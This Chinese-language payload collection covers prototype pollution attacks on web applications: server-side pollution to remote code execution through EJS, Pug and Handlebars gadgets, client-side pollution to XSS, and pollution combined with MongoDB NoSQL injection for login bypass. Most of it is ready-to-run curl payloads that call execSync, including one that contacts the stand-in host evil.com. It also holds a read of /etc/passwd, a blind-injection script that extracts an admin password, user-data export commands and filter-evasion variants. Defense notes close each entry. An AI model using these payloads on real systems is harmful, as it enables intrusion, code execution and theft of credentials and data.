# 原型链污染

_3 条 web payload_

### 服务端原型链污染到RCE  `proto-server-rce`
_通过污染JavaScript对象原型链(__proto__/constructor.prototype)注入恶意属性，在Node.js服务端利用child_process或EJS/Pug等模板引擎的gadget链实现远程代码执行。_
子类：**服务端利用** · tags: `原型链` `Prototype Pollution` `RCE` `Node.js` `__proto__`

**前置条件：**
- 目标使用Node.js
- 存在JSON合并/深拷贝操作
- 可控JSON输入

**攻击链：**

**1. 检测原型链污染点**
> 通过__proto__和constructor.prototype两种方式测试是否存在原型链污染
```
# 发送__proto__污染测试
curl -X POST "https://{TARGET}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "test123"}}'

# constructor方式
curl -X POST "https://{TARGET}/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "test123"}}}'

# 验证污染是否成功(通过报错/行为变化)
curl "https://{TARGET}/api/debug" | grep "polluted"
```
**语法解析：**
- `__proto__` — JavaScript原型链指针，指向对象的原型 _keyword_
- `constructor.prototype` — 替代的原型链访问路径，绕过__proto__过滤 _keyword_
- `polluted` — 测试属性——如果后续请求能读到则确认污染成功 _value_

**2. EJS模板引擎RCE Gadget**
> 利用EJS模板引擎的outputFunctionName/escapeFunction gadget实现RCE
```
# EJS RCE gadget——污染outputFunctionName
curl -X POST "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# 触发模板渲染
curl "https://{TARGET}/dashboard"

# EJS client参数RCE
curl -X POST "https://{TARGET}/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
```
**语法解析：**
- `outputFunctionName` — EJS模板引擎的输出函数名属性，被拼入生成的函数代码中 _keyword_
- `process.mainModule.require` — Node.js中从任意上下文引入模块的方法 _function_
- `child_process` — Node.js执行系统命令的核心模块 _value_
- `execSync("id")` — 同步执行系统命令 _command_

**3. Pug模板引擎RCE Gadget**
> 利用Pug和Handlebars模板引擎的已知gadget链实现代码执行
```
# Pug/Jade RCE gadget——污染block属性
curl -X POST "https://{TARGET}/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require(\"child_process\").execSync(\"curl evil.com/rce\");//"}}}'

# Handlebars RCE gadget
curl -X POST "https://{TARGET}/api/template" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"allowedProtoMethods": {"__defineGetter__": true}, "allowedProtoProperties": {"__defineGetter__": true}}}'
```
**语法解析：**
- `block.type: "Text"` — Pug AST节点类型，注入代码到模板编译 _json_
- `allowedProtoMethods` — Handlebars安全选项——污染后绕过原型方法限制 _keyword_

**4. 通用DoS/信息泄露Gadget**
> 利用通用gadget造成DoS、状态码篡改、环境变量注入和任意文件读取
```
# 污染toString造成异常
{"__proto__": {"toString": null}}

# 污染status属性改变响应
{"__proto__": {"status": 500}}

# 污染环境变量注入
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}

# 污染shell属性(配合child_process.exec)
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\"))//"}}}
```
**语法解析：**
- `toString: null` — 污染toString导致类型转换异常→DoS _technique_
- `NODE_OPTIONS` — Node.js启动参数环境变量 _variable_
- `/proc/self/environ` — Linux进程环境变量文件 _path_

**WAF/EDR 绕过变体：**

**绕过__proto__关键字过滤**
> 通过Unicode编码、constructor路径、嵌套对象和JSON5语法绕过__proto__过滤
```
# Unicode编码
{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}

# constructor路径
{"constructor": {"prototype": {"polluted": true}}}

# 嵌套路径
{"a": {"__proto__": {"polluted": true}}}

# 使用JSON5语法(如果支持)
{__proto__: {polluted: true}}

# 数组原型污染
{"__proto__": [], "length": 1, "0": "exploit"}
```
**语法解析：**
- `\u005f\u005f` — __的Unicode编码表示 _encoding_
- `constructor.prototype` — 替代__proto__的原型链访问方式 _technique_


**概述：** 原型链污染(Prototype Pollution)是JavaScript特有的漏洞类型，利用JS的原型继承机制。当应用程序使用不安全的深度合并(lodash.merge/deepmerge等)将用户输入合并到对象时，攻击者可通过__proto__属性污染Object.prototype，影响所有后续创建的对象。配合特定模板引擎(EJS/Pug)的gadget链可实现RCE。

**漏洞原理：** 漏洞根因：(1)JavaScript中几乎所有对象都继承自Object.prototype；(2)递归合并函数未过滤__proto__/constructor等危险键；(3)流行库如lodash(<4.17.12)、jQuery、merge-deep等存在此漏洞；(4)服务端Node.js使用EJS/Pug等模板引擎时存在已知的RCE gadget链；(5)JSON.parse不会过滤__proto__键。受影响的API通常是PATCH/PUT类的配置更新接口。

**利用方法：** 利用步骤：(1)识别接受JSON输入并进行对象合并的API端点(如PUT /settings, PATCH /profile)；(2)发送__proto__污染测试payload确认漏洞存在；(3)根据目标技术栈选择gadget链——EJS用outputFunctionName/escapeFunction，Pug用block属性；(4)构造RCE payload注入到__proto__中；(5)访问使用该模板引擎渲染的页面触发代码执行；(6)如果不能确定模板引擎，先尝试DoS和信息泄露gadget。

**防御措施：** 防御措施：(1)使用Object.create(null)创建无原型的安全对象；(2)在合并函数中过滤__proto__、constructor、prototype键；(3)升级lodash到4.17.21+修复merge漏洞；(4)使用Map代替普通对象存储用户输入；(5)对JSON输入实施JSON Schema验证，拒绝包含__proto__的请求；(6)启用--disable-proto=throw Node.js标志禁用__proto__访问。

---

### 客户端原型链污染到XSS  `proto-client-xss`
_通过URL参数、postMessage或DOM操作污染前端JavaScript原型链，利用jQuery/DOM操作库的gadget在客户端实现XSS。攻击者可通过精心构造的URL链接诱导受害者触发漏洞。_
子类：**客户端利用** · tags: `原型链` `XSS` `客户端` `jQuery` `DOM` `Prototype Pollution`

**前置条件：**
- 目标前端使用易受影响的JS库
- 存在URL参数到对象转换的逻辑

**攻击链：**

**1. 识别客户端污染源**
> 通过URL参数和Hash片段测试前端原型链污染
```
# URL参数解析污染(常见于自定义query parser)
https://{TARGET}/page?__proto__[polluted]=test
https://{TARGET}/page?__proto__.polluted=test
https://{TARGET}/page?constructor[prototype][polluted]=test

# Hash片段污染
https://{TARGET}/page#__proto__[polluted]=test

# 验证：在控制台检查
console.log(({}).polluted); // 如果输出"test"则确认污染
```
**语法解析：**
- `?__proto__[polluted]=test` — URL参数格式的原型链污染 _technique_
- `#__proto__[polluted]` — Hash片段污染(不发送到服务器) _technique_
- `({}).polluted` — 空对象检查是否继承了被污染的属性 _function_

**2. jQuery html() Gadget**
> 利用jQuery的html()方法和$.extend()深拷贝实现XSS和属性注入
```
# 污染jQuery的innerHTML gadget
# Step 1: 污染原型
https://{TARGET}/page?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>

# Step 2: 等待jQuery调用 $(element).html() 或 $.html()
# 当jQuery创建新元素时会读取innerHTML属性

# jQuery $.extend() 深拷贝污染
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// 之后所有 obj.isAdmin 都返回 true
```
**语法解析：**
- `innerHTML` — jQuery创建元素时会读取此属性 _keyword_
- `onerror=alert(document.domain)` — XSS payload——图片加载失败时执行JS _technique_
- `$.extend(true, ...)` — jQuery深拷贝函数(true=递归)——传播污染 _function_

**3. DOMPurify绕过Gadget**
> 通过污染DOMPurify配置、Lodash template和传输URL实现XSS
```
# 污染DOMPurify配置实现XSS
# 绕过ALLOWED_TAGS
https://{TARGET}/page?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src

# 污染sanitize行为
https://{TARGET}/page?__proto__[ALLOW_ARIA_ATTR]=1&__proto__[IS_ALLOWED_URI][]=javascript

# Lodash template gadget
# 如果使用 _.template 且选项被污染
https://{TARGET}/page?__proto__[sourceURL]=%22%0aalert(1)//

# 构造完整POC链接
https://{TARGET}/page?__proto__[transport_url]=javascript:alert(1)
```
**语法解析：**
- `ALLOWED_ATTR` — DOMPurify白名单配置——污染后允许危险属性 _keyword_
- `sourceURL` — Lodash template的sourceURL参数——注入到eval中 _keyword_
- `javascript:alert(1)` — 经典JavaScript伪协议XSS _technique_

**4. 自动化检测脚本**
> 使用Puppeteer自动化检测前端页面的原型链污染漏洞
```
# PPScan——自动化客户端原型链污染检测
# 使用Puppeteer自动化测试
const puppeteer = require('puppeteer');
const browser = await puppeteer.launch();
const page = await browser.newPage();

// 注入检测脚本
await page.evaluateOnNewDocument(() => {
  const marker = Math.random().toString(36);
  Object.defineProperty(Object.prototype, '__pp_test__', {
    set: function(v) { window.__ppDetected = true; }
  });
});

await page.goto('https://{TARGET}/page?__proto__[__pp_test__]=1');
const detected = await page.evaluate(() => window.__ppDetected);
console.log('Prototype Pollution:', detected ? 'VULNERABLE' : 'NOT DETECTED');
```
**语法解析：**
- `evaluateOnNewDocument` — 在页面加载前注入检测代码 _function_
- `Object.defineProperty` — 定义属性setter陷阱检测原型污染 _function_
- `__pp_test__` — 自定义检测标记属性 _variable_

**WAF/EDR 绕过变体：**

**绕过URL参数过滤**
> 通过URL编码、constructor路径和嵌套结构绕过前端原型链污染过滤
```
# URL编码__proto__
?__%70roto__[xss]=test
?%5f%5fproto%5f%5f[xss]=test

# 使用constructor路径
?constructor[prototype][xss]=test
?constructor.prototype.xss=test

# 数组索引污染
?__proto__[0]=payload

# 多层嵌套
?a[__proto__][xss]=test
?a.b.__proto__.xss=test
```
**语法解析：**
- `%5f%5f` — __的URL编码 _encoding_
- `__%70roto__` — 部分编码p字符绕过关键词匹配 _encoding_


**概述：** 客户端原型链污染是一种通过URL参数、postMessage等途径在浏览器中触发的漏洞。与服务端不同，客户端污染通常需要配合"gadget"——即代码中读取被污染属性的位置——来造成实际危害(如XSS)。jQuery、Lodash、DOMPurify等流行前端库中存在已知的gadget链。此类漏洞的发现和利用需要深入理解JS原型继承和前端库内部实现。

**漏洞原理：** 漏洞成因：(1)前端自定义URL参数解析器将?a[b]=c转为嵌套对象时未过滤__proto__；(2)第三方库如qs、query-string的旧版本存在原型链污染；(3)jQuery $.extend(true,...)、lodash.merge等深拷贝函数传播污染；(4)DOMPurify等安全库的配置可被原型污染覆盖从而失效；(5)前端框架(Vue/React)的默认属性系统可能读取到被污染的值。

**利用方法：** 利用步骤：(1)检查目标页面JS代码中是否存在自定义query parser或使用了已知易受影响的库；(2)通过URL参数发送__proto__[test]=1并在控制台验证({}).test是否返回1；(3)如果污染成功，搜索页面代码中的gadget——读取特定属性名的代码位置；(4)常见gadget：jQuery html()读innerHTML、DOMPurify读ALLOWED_ATTR、lodash template读sourceURL；(5)构造完整POC URL组合污染源和gadget触发XSS。

**防御措施：** 防御方案：(1)使用安全的URL参数解析库(qs@6.10.0+已修复)；(2)Object.freeze(Object.prototype)冻结原型防止污染(注意兼容性)；(3)升级jQuery、Lodash等库到最新版本；(4)在对象创建时使用Object.create(null)；(5)对URL参数名实施白名单校验，拒绝包含__proto__/constructor的参数；(6)使用CSP(Content-Security-Policy)作为XSS的最后防线。

---

### 原型链污染结合NoSQL注入  `proto-nosql-injection`
_将原型链污染与MongoDB/NoSQL注入组合利用。通过污染查询对象的原型链属性，绕过认证逻辑或构造恶意查询条件，实现认证绕过和数据泄露。_
子类：**组合利用** · tags: `原型链` `NoSQL` `MongoDB` `认证绕过` `组合攻击`

**前置条件：**
- 目标使用MongoDB
- 存在原型链污染点
- 存在查询构造逻辑

**攻击链：**

**1. 识别MongoDB查询注入点**
> 使用MongoDB操作符($ne/$regex/$gt)测试NoSQL注入实现认证绕过
```
# 测试NoSQL操作符注入
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex匹配
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# $gt永真条件
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```
**语法解析：**
- `{"$ne": ""}` — MongoDB不等于操作符——匹配所有非空值 _operator_
- `{"$regex": ".*"}` — 正则表达式匹配——匹配任意字符串 _operator_
- `{"$gt": ""}` — 大于空字符串——匹配所有密码 _operator_

**2. 原型链污染绕过查询校验**
> 利用原型链污染注入MongoDB的$where条件绕过操作符过滤
```
# 场景：后端有操作符过滤
# if (hasOperator(input)) reject();

# 通过原型链污染注入$where
curl -X PATCH "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$where": "function(){return true}"}}'

# 后续查询将继承$where条件
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "anything"}'
# 如果login查询使用了被污染的对象，$where永真条件导致认证绕过
```
**语法解析：**
- `$where` — MongoDB服务端JS执行操作符 _operator_
- `function(){return true}` — 永真条件——所有文档匹配 _function_
- `__proto__` — 通过原型链注入$where到查询对象 _keyword_

**3. 布尔盲注提取数据**
> 使用$regex盲注逐字符提取MongoDB中存储的密码
```
# 利用$regex逐字符提取管理员密码
import requests
import string

url = "https://{TARGET}/api/login"
password = ""
chars = string.ascii_letters + string.digits + string.punctuation

for i in range(32):
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{re.escape(c)}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "token" in r.text:
            password += c
            print(f"Found: {password}")
            break

print(f"Admin password: {password}")
```
**语法解析：**
- `$regex` — MongoDB正则表达式操作符 _operator_
- `^{password}{c}` — 锚定匹配——从头逐字符猜解 _technique_
- `re.escape(c)` — 转义正则特殊字符避免语法错误 _function_

**4. 数据库枚举与导出**
> 利用认证绕过后的管理员权限枚举和导出敏感数据
```
# 利用$func执行服务端JS(旧版MongoDB)
curl -X POST "https://{TARGET}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where": "function(){return this.role==\"admin\"}"}'

# 利用已获取的认证绕过导出数据
curl -s "https://{TARGET}/api/users?limit=1000" \
  -H "Authorization: Bearer {ADMIN_TOKEN}" | jq '.[].email'

# 检查MongoDB REST接口(如果暴露)
curl -s "https://{TARGET}:28017/" 2>/dev/null
curl -s "https://{TARGET}/api/db/_stats" 2>/dev/null
```
**语法解析：**
- `this.role=="admin"` — MongoDB $where中的JS表达式 _function_
- `28017` — MongoDB默认REST接口端口 _value_
- `{ADMIN_TOKEN}` — 通过注入获取的管理员令牌 _variable_

**WAF/EDR 绕过变体：**

**绕过NoSQL操作符过滤**
> 通过Unicode编码、Content-Type切换和表单格式绕过NoSQL注入过滤
```
# Unicode编码操作符
{"username": "admin", "password": {"\u0024ne": ""}}

# 嵌套绕过
{"username": "admin", "password": {"$eq": {"$ne": ""}}}

# 利用Content-Type差异
# application/x-www-form-urlencoded
username=admin&password[$ne]=&password[$regex]=.*

# 数组注入
username=admin&password[0][$gt]=
```
**语法解析：**
- `\u0024ne` — $ne的Unicode编码——绕过$符号过滤 _encoding_
- `application/x-www-form-urlencoded` — 切换Content-Type可能绕过JSON校验 _technique_
- `password[$ne]=` — 表单格式的NoSQL操作符注入 _technique_


**概述：** 原型链污染与NoSQL注入的组合攻击是一种高级利用手法。单独的原型链污染可能需要模板引擎gadget才能RCE，单独的NoSQL注入可能被操作符过滤拦截。但两者组合后，可以通过原型链污染绕过查询校验逻辑，将恶意MongoDB操作符注入到本应安全的查询中，实现认证绕过和数据泄露。这展示了漏洞链在现实攻击中的威力。

**漏洞原理：** 漏洞根因：(1)Node.js后端使用lodash.merge等函数处理配置/设置更新请求时存在原型链污染；(2)MongoDB查询构造时未对输入进行严格的类型检查(允许对象作为查询值)；(3)后端的操作符过滤仅检查直接属性而不检查原型链继承的属性；(4)Express.js等框架自动将URL查询参数password[$ne]=转换为嵌套对象{password:{$ne:""}}；(5)MongoDB的$where操作符允许执行任意JavaScript。

**利用方法：** 组合利用步骤：(1)先测试纯NoSQL注入——发送$ne/$gt操作符观察响应差异；(2)如果被WAF或校验拦截，寻找原型链污染入口(如PUT /settings, PATCH /config)；(3)通过原型链污染注入$where或覆盖查询校验逻辑的属性；(4)再次发送登录请求，利用被污染的原型链绕过操作符检查；(5)获取管理员Token后进一步枚举用户数据；(6)使用$regex盲注提取密码哈希或明文密码。

**防御措施：** 防御措施：(1)对所有JSON输入进行严格的类型校验(使用Joi/Zod等schema验证库)；(2)使用mongo-sanitize等库过滤查询中的$操作符；(3)禁用MongoDB的$where操作符(mongod --setParameter disableJavaScript=true)；(4)修复原型链污染：升级lodash/使用Object.create(null)/过滤__proto__键；(5)密码存储使用bcrypt，使认证绕过后获取的哈希无法直接使用；(6)实施查询参数化：mongoose的.find().where()而非直接传入对象。

---
